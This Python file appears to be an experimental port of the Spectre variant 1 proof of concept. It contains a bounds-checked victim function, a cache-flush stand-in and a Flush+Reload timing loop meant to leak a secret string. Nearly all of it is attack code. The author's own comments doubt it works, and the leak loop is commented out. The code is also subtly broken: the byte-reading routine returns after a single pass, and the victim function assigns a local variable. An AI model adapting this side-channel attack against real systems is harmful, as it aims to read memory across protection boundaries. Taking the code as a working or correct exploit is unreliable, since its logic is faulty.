import time

array1_size = 16
array1 = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]
array2 = [None] * 0x3000000
temp = 0

secret = "The Magic Words are Squeamish Ossifrage.";

def victim_function(x):
    if (x < array1_size):
        temp = array2[array1[x] << 12]



# Flush+Reload
CACHE_HIT_THRESHOLD = 4e-06
CACHE_SIZE = 12 * 1024 * 1024
eviction_buffer = [42]*CACHE_SIZE

def clflush(size, offset=64):
    # Fill our CPU cache by reading 12 mb data
    for i in range(0, size, offset):
        eviction_buffer[i]
        


def read_memory_byte(malicious_x):
    results = [0]*256

    for tries in range(999, 0, -1):
        training_x = tries % array1_size
        clflush(CACHE_SIZE)

        for j in range(33):
            for z in range(100):
                pass # delay
            # if j % 4 training_x else malicious_x
            x = ((j % 4) - 1) & ~0xFFFF
            x = (x | (x >> 16))
            x = training_x ^ (x & (malicious_x ^ training_x))
            victim_function(x)
        
        for i in range(256):
            mix_i = ((i * 167) + 13) & 255;
            time1 = time.time()
            junk = array2[mix_i * 512]
            time2 = time.time() - time1
            if (time2 <= CACHE_HIT_THRESHOLD):
                print("Cache hit!")
                results[mix_i] += 1

        j = k = -1
        for i in range(256):
            if j < 0 or results[i] >= results[j]:
                k = j
                j = i
            elif k < 0 or results[i] >= results[k]:
                k = i

        if results[j] >= (2 * results[k] + 5) or (results[j] == 2 and results[k] == 0):
            break


        value = [0, 0]
        score = [0, 0]
        value[0] = j
        value[1] = k
        score[0] = results[j]
        score[1] = results[k]

        return value, score


if __name__ == "__main__":
    # Checklist: 
    # - clflush: Works
    # - set threshold: This is weird, experiment below show that usually Python lists are not 
    # cached? I.e. we see that miss times < hit times?? Will make exploit difficult...
    # - Victim function, does it speculative execute?
    hit_s = 0
    miss_s = 0
    fp = 0
    clflush(CACHE_SIZE)
    rounds = 256
    for i in range(rounds):
        # cache miss
        time1 = time.time()
        junk = array2[i << 12]
        time2 = time.time() - time1
        if time2 <= CACHE_HIT_THRESHOLD:
            print("Wrong threshold cache miss", time2)
            fp += 1
        else:
            print("Correct")

        miss_s += time2

        # cache hit
        time1 = time.time()
        junk = array2[i << 12]
        time2 = time.time() - time1
        if time2 <= CACHE_HIT_THRESHOLD:
            print("Correct")
        else:
            print("Wrong threshold cache hit", time2)
        
        hit_s += time2

    # set threshold as avg for hit
    print("avg time for miss", miss_s/rounds)
    print("avg time for hit", hit_s/rounds)
    print("expected true:", hit_s < miss_s)
    print("false positives", fp)

    malicious_x = 0
    length = 1000

    # for _ in range(length, 0, -1):
    #     value, score = read_memory_byte(malicious_x)
    #     print("Success" if score[0] >= 2*score[1] else "Unclear")
    #     print(value[0], (chr(value[0]) if value[0] > 31 and value[0] < 127 else '?'), score[0])

    #     if (score[1] > 0):
    #         print("(second best:", value[1], "score:", score[1], ")")



